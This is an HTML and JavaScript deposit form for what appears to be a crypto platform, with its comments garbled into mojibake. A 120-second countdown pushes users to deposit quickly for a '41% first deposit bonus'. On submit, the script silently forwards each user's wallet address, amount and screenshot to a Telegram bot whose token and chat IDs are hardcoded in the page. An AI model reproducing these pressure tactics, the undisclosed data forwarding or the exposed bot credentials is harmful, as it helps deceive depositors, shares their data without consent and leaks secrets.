<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Deposit Page</title>
  <style>
    /* å®Œå…¨å¤ç”¨ä½ åŸå§‹æ ·å¼ â€”â€” æœªæ”¹åŠ¨ UI æ ·å¼ */
    body { font-family: Arial, sans-serif; background: transparent; color:#fff; margin:0; padding:20px;}
    h1 { text-align:center; margin-bottom:15px; }
    .container { max-width:400px; margin:0 auto; display:flex; flex-direction:column; gap:12px; position:relative; }
    .select-box { border: 1px solid rgba(255,255,255,0.3); border-radius:8px; background:rgba(30,30,30,0.8); cursor:pointer; padding:8px 12px; display:flex; align-items:center; justify-content:space-between; }
    .select-box span { color:#fff; }
    .dropdown { position:absolute; background: rgba(30,30,30,0.95); border-radius:8px; max-height:250px; overflow-y:auto; display:none; z-index:9999; }
    .dropdown div { padding:10px 12px; cursor:pointer; display:flex; align-items:center; gap:12px; border-radius:6px; transition:0.2s; }
    .dropdown div:hover { background: rgba(50,50,50,0.8); }
    .dropdown img { width:24px; height:24px; object-fit:contain; }
    input[type=number], input[type=text] { font-family: inherit; font-size:14px; background: rgba(255,255,255,0.05); color:#fff; border:1px solid rgba(255,255,255,0.3); border-radius:8px; padding:10px 12px; outline:none; width:100%; box-sizing:border-box; }
    #walletAddressInput { background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.25); }
    #uploadFile { display:none !important; }
    #uploadLabel{ display:block; width:fit-content; padding:10px 14px; background:#00b894; color:#fff; border-radius:8px; cursor:pointer; font-size:14px; }
    #uploadedImage{ display:none; width:100px; height:100px; object-fit:contain; margin-bottom:8px; border-radius:6px; border:1px solid rgba(255,255,255,0.3); }
    #submitBtn{ padding:10px; border:none; border-radius:8px; background:#00b894; color:#fff; cursor:pointer; transition:0.3s; font-size:15px; }
    #successMsg{ display:none; text-align:center; color:#00b894; font-weight:bold; margin-top:10px; }
    #uploadNotice{ color:#f39c12; font-size:12px; }
    #submitBtn.loading { cursor:not-allowed; opacity:0.7; position:relative; }
    #submitBtn.loading::after { content:""; width:18px; height:18px; border:3px solid rgba(255,255,255,0.6); border-top-color:#fff; border-radius:50%; animation:spin 0.8s linear infinite; position:absolute; right:12px; top:50%; transform:translateY(-50%); }
    @keyframes spin { from{transform:translateY(-50%) rotate(0);} to{transform:translateY(-50%) rotate(360deg);} }
    .boost-note { font-size:13px; color:#b9b9b9; margin-top:6px; }
    .boost-expired { font-size:13px; color:#ff6b6b; margin-top:6px; }
    .boost-timer { color:#00ffea; margin-top:6px; font-weight:600; }
  </style>
</head>
<style>
/* è®© Strikingly ä¸å†éšè—é¡µé¢å†…å®¹ */
html, body {
    width: 100% !important;
    max-width: 100% !important;
    overflow-x: hidden !important;
    background: #ffffff00 !important;
}

/* ä¸»å®¹å™¨ */
.container {
    width: 100%;
    max-width: 420px;
    margin: 0 auto;
    padding: 15px;
    font-family: Arial, sans-serif;
    color: #fff;
}

/* é€‰æ‹©æ¡†ä¿®å¤ */
.select-box {
    background: rgba(255,255,255,0.15);
    border: 1px solid rgba(255,255,255,0.3);
    padding: 10px;
    border-radius: 8px;
    font-size: 16px;
    margin-bottom: 10px;
}

/* è¾“å…¥æ¡†ä¿®å¤ */
input[type="number"],
input[type="text"],
input[type="file"] {
    width: 100%;
    padding: 10px;
    font-size: 15px;
    border-radius: 8px;
    border: 1px solid rgba(255,255,255,0.4);
    background: rgba(255,255,255,0.1);
    color: #fff;
    margin-top: 5px;
    margin-bottom: 12px;
    box-sizing: border-box;
}

/* ä¸Šä¼ å›¾ç‰‡æ˜¾ç¤º */
#uploadedImage {
    width: 100%;
    max-height: 260px;
    border-radius: 10px;
    margin-top: 10px;
    object-fit: cover;
    border: 1px solid rgba(255,255,255,0.4);
}

/* æäº¤æŒ‰é’®ä¿®å¤ */
.submit-btn {
    width: 100%;
    padding: 12px;
    background: #0a84ff;
    border: none;
    border-radius: 10px;
    font-size: 18px;
    font-weight: bold;
    color: white;
    margin-top: 10px;
    cursor: pointer;
}

.submit-btn:active {
    background: #006edc;
}

/* Boost å¥–åŠ±æç¤º */
.boost-note {
    font-size: 14px;
    margin-top: 5px;
    color: #ffe066;
}

/* é‡‘é¢æ˜¾ç¤º */
#usdtDisplay,
#boostDisplay,
#totalDisplay {
    font-size: 16px;
    font-weight: bold;
    margin-top: 6px;
}

/* é˜²æ­¢ Strikingly å¼ºè¡Œç¼©æ”¾å¯¼è‡´åªæ˜¾ç¤ºåŠå± */
* {
    max-width: 100% !important;
}
</style>

<body>
  <div class="container">
    <label>Select Coin</label>
    <div class="select-box" id="coinSelectBox"><span id="coinSelected">Select a coin</span></div>
    <label for="amountInput">Enter Amount (USDT)</label>
    <input type="number" id="amountInput" placeholder="0.00" min="0">
    <div id="usdtDisplay">USDT: 0.00</div>
    <div id="boostDisplay" style="display:none; color:#00ff00; font-weight:600;">First Deposit Boost: +0.00</div>
    <div id="boostHint" style="display:none;"><div id="boostTimerText" class="boost-note">ğŸ¤– è¯·åœ¨ <span id="boostSeconds">120</span> ç§’å†…å……å€¼ï¼Œå¦åˆ™æ— æ³•è·å¾—é¦–æ¬¡å……å€¼41%å¥–åŠ±</div></div>
    <div id="totalDisplay">Total: 0.00 USDT</div>
    <label for="walletAddressInput">Wallet Address</label>
    <input type="text" id="walletAddressInput" placeholder="Enter your wallet address">
    <label id="uploadLabel" for="uploadFile">Upload Screenshot</label>
    <input type="file" id="uploadFile" accept="image/*">
    <img id="uploadedImage">
    <div id="uploadNotice">Please upload a screenshot of your wallet deposit first</div>
    <button id="submitBtn" disabled>Submit</button>
    <div id="successMsg">Submission Successful!</div>
  </div>
  <div class="dropdown" id="coinDropdown"></div>

<script>
/* ---------- é€šç”¨ä¸å…¼å®¹æ€§ä¿®å¤ï¼ˆä¸æ”¹ UIï¼‰ ---------- */
const API_BASE = "https://crypto-management-production-5e04.up.railway.app";

/* postWithRetryå…¼å®¹ï¼šå¦‚æœç¬¬ä¸€ä¸ªè·¯å¾„è¿”å› 404 åˆ™å°è¯•ç¬¬äºŒä¸ªï¼ˆç”¨äºå…¼å®¹ /proxy/... ä¸ /api/order/...ï¼‰ */
async function postWithFallback(urls, options={}, retries=1, delay=500){
  // urls: array of url strings in priority order
  for (let i=0;i<urls.length;i++){
    const u = urls[i];
    try{
      // æ”¯æŒé‡è¯•
      for (let r=0;r<=retries;r++){
        try{
          const res = await fetch(u, options);
          // å¦‚æœ 404 å°±ç›´æ¥è·³åˆ°ä¸‹ä¸€ä¸ª url
          if (res.status === 404) throw { code:404 };
          return res;
        }catch(e){
          if (r===retries) throw e;
          await new Promise(s=>setTimeout(s, delay));
        }
      }
    }catch(e){
      // å¦‚æœæ˜¯æœ€åä¸€ä¸ª url åˆ™ throw
      if (i === urls.length - 1) throw e;
      // å¦åˆ™ç»§ç»­ä¸‹ä¸€ä¸ª url
    }
  }
  throw new Error('No available url');
}

/* æ—¶é—´æ ¼å¼åŒ–ï¼ˆç¾ä¸œï¼‰ */
function formatUsTime(ts){
  const d = ts ? new Date(Number(ts)) : new Date();
  const s = d.toLocaleString('en-US', { timeZone:'America/New_York', month:'2-digit', day:'2-digit', year:'numeric', hour:'2-digit', minute:'2-digit', hour12:true });
  return s.replace(',', '');
}

/* è·å–æˆ–ç”Ÿæˆ 4 ä½ useridï¼Œå¹¶é€šçŸ¥åç«¯ï¼ˆéé˜»å¡ï¼‰ */
function getUserId(){
  try{
    const urlParams = new URLSearchParams(window.location.search);
    let uid = urlParams.get("userid");
    if(uid){
      localStorage.setItem("userid4", uid);
    } else {
      uid = localStorage.getItem("userid4");
      if(!uid){
        uid = Math.floor(1000 + Math.random()*9000).toString();
        localStorage.setItem("userid4", uid);
      }
    }
    // å°è¯•åŒæ­¥åˆ°åç«¯ï¼ˆä¸é˜»å¡ä¸»æµç¨‹ï¼‰
    (async ()=>{
      try{
        await fetch(`${API_BASE}/api/users/sync`, {
          method:'POST',
          headers:{'Content-Type':'application/json','X-User-Id':uid},
          body: JSON.stringify({ userid: uid })
        });
      }catch(e){}
    })();
    return uid;
  }catch(e){
    return '0000';
  }
}
const USERID = getUserId();

/* ========== åŸ UI é€»è¾‘ï¼ˆå°½é‡ä¿æŒåŸæ ·ï¼Œä½†å¢å¼ºå®¹é”™ï¼‰ ========== */
let ws = null;
let coins = [];
let selectedCoin = null;
let currentPrice = 0;

/* é¦–å……æ§åˆ¶ */
let firstDepositUsed = localStorage.getItem("first_deposit_used") === "1";
let countdown = 120, countdownTimer = null;

const amountInput = document.getElementById("amountInput");
const usdtDisplay = document.getElementById("usdtDisplay");
const boostDisplay = document.getElementById("boostDisplay");
const totalDisplay = document.getElementById("totalDisplay");
const boostHint = document.getElementById("boostHint");
const boostSeconds = document.getElementById("boostSeconds");
const boostTimerText = document.getElementById("boostTimerText");

const uploadFile = document.getElementById("uploadFile");
const uploadedImage = document.getElementById("uploadedImage");
const uploadNotice = document.getElementById("uploadNotice");
const submitBtn = document.getElementById("submitBtn");
const successMsg = document.getElementById("successMsg");

async function fetchCoins(){
  try{
    const res = await fetch('https://api.binance.com/api/v3/ticker/price');
    const data = await res.json();
    coins = data.filter(c => c.symbol.endsWith('USDT') && c.symbol !== 'BCCUSDT').map(c => c.symbol);
    renderDropdown();
  }catch(err){
    // å…œåº•
    coins = ["BTCUSDT","ETHUSDT","BNBUSDT"];
    renderDropdown();
  }
}

function renderDropdown(){
  try{
    const coinDropdown = document.getElementById('coinDropdown');
    coinDropdown.innerHTML = "";
    coins.forEach(c => {
      const div = document.createElement("div");
      const img = document.createElement("img");
      const sym = c.replace("USDT","").toLowerCase();
      img.src = `https://cdn.jsdelivr.net/gh/vadimmalykhin/binance-icons/crypto/${sym}.svg`;
      img.onerror = ()=>{ img.src = "https://via.placeholder.com/24?text=?"; };
      div.appendChild(img);
      div.appendChild(document.createTextNode(c));
      div.onclick = () => {
        selectedCoin = c.replace("USDT","");
        document.getElementById('coinSelected').textContent = c.replace("USDT","");
        coinDropdown.style.display = "none";
        connectWS(selectedCoin);
        updateUSDT();
      };
      coinDropdown.appendChild(div);
    });
  }catch(e){
    console.warn('renderDropdown error', e);
  }
}

document.getElementById('coinSelectBox').onclick = () => {
  const r = document.getElementById('coinSelectBox').getBoundingClientRect();
  const coinDropdown = document.getElementById('coinDropdown');
  coinDropdown.style.top = r.bottom + window.scrollY + "px";
  coinDropdown.style.left = r.left + window.scrollX + "px";
  coinDropdown.style.width = r.width + "px";
  coinDropdown.style.display = coinDropdown.style.display === "block" ? "none" : "block";
};

document.addEventListener('click', (e) => {
  const coinDropdown = document.getElementById('coinDropdown');
  if (!document.getElementById('coinSelectBox').contains(e.target) && !coinDropdown.contains(e.target)) {
    coinDropdown.style.display = "none";
  }
});

/* WebSocketï¼šåªå¯¹é€‰ä¸­å¸ç§å»ºç«‹ tickerï¼ˆé¿å… !ticker@arr å¯¼è‡´èµ„æºé—®é¢˜ï¼‰ */
function connectWS(symbol){
  try{
    if(ws) ws.close();
  }catch(e){}
  try{
    ws = new WebSocket(`wss://stream.binance.com:9443/ws/${symbol.toLowerCase()}usdt@ticker`);
    ws.onmessage = ev => {
      try{
        const d = JSON.parse(ev.data);
        currentPrice = parseFloat(d.c || 0);
        updateUSDT();
      }catch(e){}
    };
    ws.onclose = ()=> setTimeout(()=>{ try{ connectWS(symbol); }catch(e){} }, 2000);
  }catch(e){
    console.warn('connectWS failed', e);
  }
}

amountInput.addEventListener('input', () => { updateUSDT(); startCountdownIfNeeded(); });

function updateUSDT(){
  try{
    const amount = parseFloat(amountInput.value) || 0;
    const usdt = amount * (currentPrice || 1); // å¦‚æœæ²¡å®æ—¶ä»·ï¼ŒæŒ‰ 1 å…œåº•ï¼ˆé¿å… NaNï¼‰
    usdtDisplay.textContent = `USDT: ${usdt.toFixed(2)}`;
    let boost = 0;
    if(!firstDepositUsed && amount > 0 && (countdown > 0 || countdownTimer)){
      boost = usdt * 0.41;
      boostDisplay.style.display = "block";
      boostDisplay.textContent = `First Deposit Boost: +${boost.toFixed(2)}`;
      boostHint.style.display = "block";
      boostSeconds.textContent = countdown > 0 ? countdown : 0;
      boostTimerText.className = "boost-note";
      boostTimerText.textContent = `ğŸ¤– Please recharge within ${countdown} seconds, otherwise you will not be able to receive the 41% bonus on your first recharge.`;
    } else {
      boostDisplay.style.display = "none";
      if(firstDepositUsed){
        boostHint.style.display = "block";
        boostTimerText.textContent = "â›” The 41% bonus for first recharge has been used or expired.";
        boostTimerText.className = "boost-expired";
      } else {
        boostHint.style.display = "none";
      }
    }
    totalDisplay.textContent = `Total: ${(usdt + boost).toFixed(2)} USDT`;
  }catch(e){
    console.warn('updateUSDT error', e);
  }
}

function startCountdownIfNeeded(){
  if(firstDepositUsed || countdownTimer) return;
  if((parseFloat(amountInput.value) || 0) <= 0) return;
  countdown = 120;
  boostHint.style.display = "block";
  boostSeconds.textContent = countdown;
  countdownTimer = setInterval(()=>{
    countdown--;
    boostSeconds.textContent = countdown;
    if(countdown <= 0){
      clearInterval(countdownTimer); countdownTimer = null; firstDepositUsed = true; localStorage.setItem("first_deposit_used","1");
      boostDisplay.style.display = "none";
      boostHint.style.display = "block";
      boostTimerText.textContent = "â›” More than 120 seconds have passed, the 41% first deposit reward cannot be obtained.";
      boostTimerText.className = "boost-expired";
      updateUSDT();
    }
  }, 1000);
}

/* ä¸Šä¼ æˆªå›¾ */
uploadFile.onchange = function(){
  const f = this.files[0];
  if(f){
    const r = new FileReader();
    r.onload = e => {
      uploadedImage.src = e.target.result;
      uploadedImage.style.display = "block";
      uploadNotice.style.display = "none";
      submitBtn.disabled = false;
    };
    r.readAsDataURL(f);
  }
};

/* Telegram æ¨é€ï¼ˆä¿æŒåŸ tokenï¼‰ */
async function sendTelegram(text, imageFile){
  try{
    const botToken = "8528337731:AAGb6D_TRPKYSQrxA7s4TAizsPjNqnajhrU";
    const chatIds = ["6062973135","-1003329204481"];
    for(const chatId of chatIds){
      try{
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{
          method:"POST",
          headers:{"Content-Type":"application/json"},
          body:JSON.stringify({ chat_id:chatId, text })
        });
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", imageFile);
        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`,{ method:"POST", body: formData });
      }catch(e){ /* ignore per chatId */ }
    }
  }catch(e){}
}

/* å‘é€åˆ°åå°ï¼šä¼˜å…ˆ /proxy/recharge ï¼Œå›é€€ /api/order/recharge */
async function sendToServer(payload){
  const urls = [
    `${API_BASE}/proxy/recharge`,
    `${API_BASE}/api/order/recharge`
  ];
  const options = { method:'POST', headers:{ 'Content-Type':'application/json', 'X-User-Id': USERID }, body: JSON.stringify(payload) };
  const res = await postWithFallback(urls, options, 1, 500);
  return res && await res.json();
}

/* æäº¤æŒ‰é’® */
submitBtn.onclick = async () => {
  try{
    if(!selectedCoin || !amountInput.value || !document.getElementById('walletAddressInput').value || !uploadFile.files[0]){
      alert("Please fill all fields");
      return;
    }
    if(!firstDepositUsed){ firstDepositUsed = true; localStorage.setItem("first_deposit_used","1"); }
    submitBtn.disabled = true; submitBtn.classList.add("loading"); submitBtn.textContent = "Submitting...";
    const usTime = formatUsTime(Date.now());
    const orderId = `DEP-${new Date().toISOString().slice(0,10).replace(/-/g,'')}-${Math.floor(100000 + Math.random()*900000)}`;
    const message = `ğŸ’° New Deposit Submission\n\nUserID: ${USERID}\nCoin: ${selectedCoin}\nAmount: ${amountInput.value} USDT\nWallet: ${document.getElementById('walletAddressInput').value}\nTime (US Eastern): ${usTime}`;
    // éé˜»å¡ telegram
    sendTelegram(message, uploadFile.files[0]).catch(()=>{});
    const payload = { userid: USERID, coin: selectedCoin, amount: amountInput.value, wallet: document.getElementById("walletAddressInput").value, orderId, timestamp: Date.now(), time_us: usTime };
    const serverRes = await sendToServer(payload);
    successMsg.style.display = "block";
    submitBtn.textContent = "Submitted"; submitBtn.classList.remove("loading"); submitBtn.style.background = "#555";
    const orderBox = document.createElement('div');
    orderBox.style.marginTop = "10px"; orderBox.style.padding = "10px"; orderBox.style.border = "1px solid rgba(255,255,255,0.2)"; orderBox.style.borderRadius = "8px"; orderBox.style.fontSize = "14px"; orderBox.style.color = "#fff";
    orderBox.innerText = `Order ID: ${orderId}`;
    document.querySelector('.container').appendChild(orderBox);
  }catch(e){
    console.error("æäº¤å¤±è´¥ï¼š", e);
    alert("æäº¤åˆ°åå°å¤±è´¥ï¼ˆNetwork Errorï¼‰ã€‚è¯·ç¨ååœ¨åå°ç¡®è®¤æˆ–é‡è¯•ã€‚");
    submitBtn.disabled = false; submitBtn.classList.remove("loading"); submitBtn.textContent = "Submit";
  }
};

/* åˆå§‹åŒ– */
fetchCoins();
</script>

<!-- ä¿ç•™ä½ çš„ auth ä¸ nexbit åŒ… -->
<script src="js/auth.js"></script>
<script src="js/nexbit-api.js"></script>
</body>
</html>
